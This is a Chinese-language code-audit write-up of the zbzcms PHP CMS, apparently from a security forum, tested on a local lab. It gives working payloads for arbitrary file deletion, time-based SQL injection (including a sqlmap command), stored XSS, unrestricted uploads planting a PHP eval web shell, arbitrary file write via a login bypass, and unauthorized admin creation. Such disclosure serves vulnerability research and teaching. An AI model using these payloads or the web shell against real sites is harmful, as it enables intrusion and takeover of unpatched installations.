0x0前言
-----

也是源自于闲来无事 在之前逛cnvd的时候 发现的cms 然后下下来了一直没审  
现在也是审了一下  
cms也比较老了 有段时间没更新了

也没用很难 供新手学习(篇幅有点长)

下载地址:<http://zbzcms.com/>

工具：seay phpstorm phpstudy  
还是老方法 先用审计工具跑一波

0x1开始
-----

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-971c596ad8ec5f222dea3fbde91aafe56461461c.png)

还是现看看首页长什么样子

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-282b1533b2ba56a184d660a58c5f3461b22d931d.png)

是一个智能家居网站

然后逐步分析 工具跑步来的漏洞

0x2第一处 任意文件删除
-------------

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-23264a6e84318aa632c48cc79115e81baddddfa0.png)

我们点进去查看详细

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-d38ad75918640e900b2908c839ed71fff26c2ffd.png)

发现没有做任何的校验判断  
$run从上面发现 也是通过GET传的

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-98d11e46c77f61adfd1684999cc15258ca535799.png)

通过审计工具也可以直接看到路径

> /zbzcms.com/cms/cms/include/up.php?run=del

那我们来构造一下  
先在up.php同目录下创建一个txt

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-c40d136f102810a7d4662038dbaeb688d0c560aa.png)

构造一下

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-baee8fe4567a5f212efb9b54248c78febf57df4d.png)

执行后页面返回1  
然后查看文件夹

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-7a85d9d51fbf2202863b0e4b231123ceb2cd9823.png)

成功删除  
我们在上一级目录在创建一个2.txt

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-5055ce446a5cebdaab712c46d4b0e28d24ae63f6.png)

然后构造执行

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-ff9bad05614529e92ee70faadd16940e67dda15c.png)

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-3191120edc029fa3db7c4feb69e6c5059b9ae5fc.png)

也成功删除

0x3第二处 前台sql注入
--------------

### 第一处注入点

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-704e3f8e4545c325f266e4552a29d0cfb46ef654.png)

点进去详细查看

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-dda023e8ccf41e4dd7d2dfbe5e918f797bf23e37.png)

这里没有做过滤 我们到phpstorm里面看sql文件

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-e5ca53a535464c199575d42cef27a4470adfeebb.png)

在这个文件中可以看到 是有一个处理函数的 但是只针对 insert 和update

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-f3ea8bb658404f0f92146c64b2535561204232f1.png)

select查询函数并没有处理和其他的过滤 可直接导致注入 进行 延时注入

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-e9347ca5ef58a15025347fa4c1b643fc4fe6e126.png)

直接丢sqlmap跑了 payload：

```php
python sqlmap.py -u "http://127.0.0.1/zbzcms.com/cms/common/php/ajax.php?run=dj&id=1" -p id
```

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-d26101568279fe763b06ed713dc6d2a27b2ca328.png)

0x4第二处注入点
---------

差不多和上面的一样功能点 从代码上看

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-64a48a1ab69c6f6349f0ac4502af1a777a3cf9ae.png)

也是get传参 调用select函数 没有任何过滤

路径127.0.0.1/zbzcms.com/cms/common/php/ajax.php?run=ad&amp;id=1  
直接构造payload了：127.0.0.1/zbzcms.com/cms/common/php/ajax.php?run=ad&amp;id=1 and sleep(2)

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-7c79330b879dc5d6fbfe45af561d33eb9fac2a91.png)

也是可以延时盲注的

0x5第三处注入
--------

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-6d7a9d86fdf6d946ea65ee4293649d64258c5bab.png)

根跟进查看

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-3b33337c02b8d4c3c5917578e5e07bb48dd75557.png)

这直接妥妥的注入了 啥防护都没有  
直接构造payload：[http://127.0.0.1/zbzcms.com/cms/cms/include/make.php?php=1&amp;art=1%20and%20sleep(5](http://127.0.0.1/zbzcms.com/cms/cms/include/make.php?php=1&art=1%20and%20sleep(5))

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-df4f9c5d16a348ab9fc11f09f56f5a7b62af0ac2.png)

就不丢sqlmap演示了

0x6第四处注入
--------

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-334c5fd33ddc8bf777884f6bae5cca791788ba87.png)

我们跟进代码

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-45ff191b864f1472a773ff1431e197752974c1f9.png)

这里的问题出现在tid这个参数  
通过前面我们可以看到 如果if判断失败的话 进入else if 通过获取get传参 然后传入sql语句 这里也是没有任何防范  
但是这里需要简单闭合一下阔号  
我们构造payload：

```php
http://127.0.0.1/zbzcms.com/cms/cms/include/zidong.php?id=1&tid=3)+and+sleep(1)%23&laiyuan=0&sou=1&wid=1
```

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-4f376bb98bbc7be3a79994929b3265af3865ccc6.png)

这里tid参数的值还是有点点讲究 必须和数据库里面存的tid值其中之一是一样的

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-9a3c0711a7670981f5bf4d768077c7e9607c9e7a.png)

0x7第三处 前台存储xss
--------------

这个是在发现注入的时候看见的

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-d6174cb84b1623124e5abd96a12aef18a917a04a.png)

这处留言的地方  
问题出现在neirong这个参数没有经过任何过滤就输出到了页面 并且还存入了数据库 所以导致后台查看的时候直接执行了

这出xss需要用POST的请求方法 因为从代码上可以看到 if的判断条件是$\_POST 不为空  
然后我们来到页面构造xss

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-91a3cbaa1248bb4ca165e64c85f97211039a769c.png)

执行之后 我们登入后台来查看留言

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-df0451bd549a8c025884978b7b49b61895ac7700.png)

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-d1377a673fafb5abb13a27684a35987508f669c0.png)

查看详情也是直接就弹

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-132139ee26f367c4876333fe20c58f4241f403be.png)

F12查看代码 语句也加载进来了

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-c99dcf006fcf6d0129d05a1b5d6f1931ac8b0c3c.png)

0x8第四处 文件上传
-----------

### 文件上传1

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-83647a942046a5bc7bb0f97e2be3fe2c75136f5d.png)

从路径可以发现是后台的 (但没影响 后面发现有api路径 就是任意上传)

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-f62188b11498bb7dade70bb4947a00b20256bd9c.png)

啥过滤 判断都没有 直接传  
因为刚开始麻烦找payload数据那些 就在后台去找了一下上传点抓包

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-f35214d4f083bbb23ddecbda0d48f5a6c8c7184f.png)

上传的时候抓包

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-04a85f0e8c31d477520ff2fa0232ec3c2dafcabd.png)

然后复制返回的路径 拼接到url上打开

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-07a46eb85861a5b6b97fb884fdddf45f141fd042.png)

也是成功执行  
整体payload：url路径：/zbzcms.com/cms/cms/admin/ajax.php?run=youad\_pic  
参数：

```php
------WebKitFormBoundary1yVpo1vIVcMvlXNA
Content-Disposition: form-data; name="0"; filename="yjh.php"
Content-Type: application/octet-stream

herman
<?php @eval($_POST['a']); phpinfo();?>
------WebKitFormBoundary1yVpo1vIVcMvlXNA--
```

### 文件上传2

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-1590651423e655880725f8dfe812456cccea67ef.png)

来到phpstorm 可以发现没有任何的过滤

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-8f35f71213b9ab24d1dca7a2747e912ac4d97bef.png)

直接获取到路径这些就上传  
那我们直接构造payload：

```php
POST /zbzcms.com/cms/cms/include/up.php?run=file&path=../../upload/up/&filename=0 HTTP/1.1
Host: 192.168.1.7
Content-Length: 238
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryqwBQidHCCHB076er
Origin: http://192.168.1.7
Referer: http://192.168.1.7/zbzcms.com/cms/cms/admin/type.php?id=1&dq=3
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,is;q=0.8,zh-TW;q=0.7
Cookie: PHPSESSID=utnoq283ip9p4fuu5dfm56qmo5
Connection: close

------WebKitFormBoundaryqwBQidHCCHB076er
Content-Disposition: form-data; name="0"; filename="yjh.php"
Content-Type: application/octet-stream

herman
<?php @eval($_POST['a']); phpinfo();?>
------WebKitFormBoundaryqwBQidHCCHB076er--
```

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-a1e0c67a6c5687c455e93da2cc35c18081bcaf16.png)

我们的访问地址：<http://192.168.1.7/zbzcms.com/cms/upload/up/16422582210.php> 因为有两个../嘛 所以路径变了

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-7cd2167cc52456461c78dd539e19ff1b524d00e0.png)

### 文件上传3

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-c56b1b2ccd06ba5a8224b9db14e936e63f0553bd.png)

在这个upload.php文件下  
这里也是没有做任何的过滤  
name为1的时候 也跳过了下面的后缀判断  
直接构造payload：

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-111cfca2dc588aa0f500473f7239f4f34b8672e6.png)

也是成功写入

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-f8f5081d7beae343ef139ed23dd4075c296229ba.png)

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-fc94eb4a2e19d85657d82b0d7f65fc3559a13509.png)

### 文件上传4

在另一个路径下http://192.168.1.7/zbzcms.com/cms/cms/zbzedit/php/zbz.php  
我们来看代码

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-e78206d0ccf5e733ce489113751004e003115a10.png)

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-8583ca7fcc99ae9caf8b592e72e0de7fbe3fbbbc.png)

进行了一些花里胡哨的操作 主要的问题 还是没有任何过滤和限制  
通过path和path\_res控制路径  
data\_pic\_name 控制文件名0改名1不改  
然后就是上传了  
那就直接构造payload：

```php
POST /zbzcms.com/cms/cms/zbzedit/php/zbz.php?run=uptxt&path=../../../upload/up/&path_res=../../upload/up/&data_pic_name=1 HTTP/1.1
Host: 192.168.1.7
Content-Length: 238
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryQy3ayf3rnYVYcEcG
Origin: http://192.168.1.7
Referer: http://192.168.1.7/zbzcms.com/cms/cms/zbzedit/edit.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,is;q=0.8,zh-TW;q=0.7
Cookie: PHPSESSID=utnoq283ip9p4fuu5dfm56qmo5
Connection: close

------WebKitFormBoundaryQy3ayf3rnYVYcEcG
Content-Disposition: form-data; name="0"; filename="yjh.php"
Content-Type: application/octet-stream

herman
<?php @eval($_POST['a']); phpinfo();?>
------WebKitFormBoundaryQy3ayf3rnYVYcEcG--
```

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-e924322ed09caa261c4ed3b1c096179a915b3d0f.png)

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-5bc979d9e5b8a19f69689c90fe82d8c0ddc1a675.png)

成功上传

### 0x9第五处 任意文件写入

本来这个是在看上传的 结果看到 一个文件保存的地方 存在一个经典的文件写入函数file\_put\_contents  
然后就分析了一波 发现是存在任意文件写入的

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-43526627d0fcb3ba29415494f3fa29d9edfe0f42.png)

这里首先是判断的run参数 然后获取post传参的值 然后判断魔术引号那个设置是否开启 相当于放注入一些转义的功能  
如果开启 在用stripslashes() 函数把反斜杠删去  
然后下面就直接写入了  
当时这个文件是在admin目录下 相当于后台的 但是通过上面的权限控制发现 可以直接绕过 这登录判断相当于就没有  
我们来看上面判断登录的代码

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-2964050cfd5df0d43fc5e2ab6aa2b305dc854205.png)

通过run参数的值来判断 这不搞笑嘛 run不等于这个值不久 直接不判断了 直接执行下面的  
好了 现在来构造payload：

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-fe3c78fedadfeb489ff544c795b8ef5394dce943.png)

执行之后

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-c0ae80c9bbbb564f1ff0f22c0027a5b0e62700b9.png)

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-17af6f7ce5c851bc8aac7bb9157054316cd088cd.png)

也是成功的写入 以及访问到  
如果get\_magic\_quotes\_gpc()函数开启的话 写马就需要用没有引号的马子

0x10第六处 未授权任意管理员添加
------------------

还是这个文件  
有一个add 操作 没有指定表

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-6ed9230c794c7682bbb210ee5f0a5df84722ec32.png)

可直接任意指定表 我们往admin表添加一个用户  
构造payload

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-512ccf8e2316834432ff725b55f8fbae8f614601.png)

执行之后

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-5d5fa729a7c5ff080c3268c78bd5fe3dabd384b1.png)

也是成功的添加进来  
未授权删除 修改

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-94e3c769ffbf30085646912ca32e74fb82c7a5c3.png)

逻辑都一样

0x11第七处 任意文件删除
--------------

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-b46fbc796b6f31fea7bbeea6d66a11cc5da8acab.png)

这里延续上面的文件上传3的 upload文件

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-8d87fa568d6e8b3e8efc497a9b5c18116cf228a4.png)

这里存在if else判断 没进入上传的条件的话 就执行下面的删除操作  
也是没有任何过滤 直接通过传参del跟上路径 直接任意删除 我们先在目录下创建一个1.txt

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-fbfa493fff360e0b32a1dfbbb22ba234a81c200b.png)

在上一级目录下创建 然后我们构造payload 删除  
<http://192.168.1.7/zbzcms.com/cms/cms/include/upload.php?del=../1.txt>

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-748537217f6867775c96d54902ab3f5aafd7a2a6.png)

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-0fa89185af0a4c8d53828587587b08bf5a417659.png)

也是成功删除

0x12第八处 未授权添加管理员
----------------

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-bd114445fb1ea33f824b948176351c6d0ce9a7e3.png)

问题出现在这个文件 这个文件夹前面我们也分析过 这里漏了一个管理员添加  
也是直接构造run参数 未授权添加

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-1357e41beeaf7125ea1bd6e0e81bd20d9005ea81.png)

然后查看数据库

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-fa3d52e3c2394a7a5f4e91a5ce5f6c8efc124640.png)

但是发现这个时候 是没有等级的 相当于权限 也就等不进去

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-2db4497e030b385e010fbce794de0222a6d0c100.png)

但是这个文件前面有一个判断是判断是否登录的

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-53026390d7489765fcbeb442de4b730306bb2588.png)

我们先通过login 来得到session  
直接构造

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-3f0513bd9a28944d7c8b37aeabef86db24eabc3b.png)

注意 这里是pwd  
然后将这个路径http://192.168.1.7/zbzcms.com/cms/cms/admin/复制到 url  
回车即可

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-f6dbcad5b41faeebe6393443b6f2dd7fb3b15f0c.png)

还有一种方式

在添加管理员的时候 把等级参数 填上

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-aa73dc6c78e148c3b96857f586eef738ad5da0e1.png)

然后查看数据库

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-17d3d825db28664f0732d329ed050ddac0ffebfa.png)

刚添加的abc 权限为1  
直接登录

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-66dc795c98619b809e602378a683f7cf08051312.png)

0x13最后
------

如果有什么说的不好的地方请师傅们指出~